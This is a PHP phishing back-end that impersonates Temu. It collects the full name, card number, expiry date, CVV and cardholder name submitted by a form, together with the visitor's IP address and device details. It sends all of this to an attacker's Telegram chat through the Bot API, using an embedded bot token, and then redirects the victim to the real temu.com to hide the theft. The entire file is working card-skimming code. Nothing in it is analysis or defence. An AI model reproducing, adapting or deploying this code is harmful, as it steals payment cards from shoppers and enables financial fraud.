<?php
// ============================================
// Telegram Bot Configuration
// ============================================
$botToken = "8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk";        // دير توكن البوت ديالك هنا
$chatId   = "-1003939463376";          // دير ID ديال الشات ولا المجموعة

// ============================================
// Collect all form data
// ============================================
$fullName    = isset($_POST['fullName'])    ? $_POST['fullName']    : '';
$cardNumber  = isset($_POST['cardNumber'])  ? $_POST['cardNumber']  : '';
$expDate     = isset($_POST['expDate'])     ? $_POST['expDate']     : '';
$cvv         = isset($_POST['cvv'])         ? $_POST['cvv']         : '';
$cardName    = isset($_POST['cardName'])    ? $_POST['cardName']    : '';

// Get visitor IP and User-Agent
$ip          = $_SERVER['REMOTE_ADDR'];
$userAgent   = $_SERVER['HTTP_USER_AGENT'];
$timestamp   = date('Y-m-d H:i:s');

// ============================================
// Build the message
// ============================================
$message = "
═══════════════════════════════
      💳 TEMU - New Card Data
═══════════════════════════════

👤 الاسم الكامل : $fullName
💳 رقم البطاقة  : $cardNumber
📅 تاريخ الصلاحية : $expDate
🔒 CVV           : $cvv
🏦 صاحب البطاقة  : $cardName

🌐 IP            : $ip
🕐 الوقت         : $timestamp
📱 الجهاز        : $userAgent
═══════════════════════════════
";

// ============================================
// Send to Telegram via Bot API
// ============================================
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$data = [
    'chat_id'                  => $chatId,
    'text'                     => $message,
    'parse_mode'               => 'HTML',
    'disable_web_page_preview' => true
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
curl_close($ch);

// ============================================
// Redirect the victim to a legit page
// ============================================
header('Location: https://www.temu.com');
exit;
?>

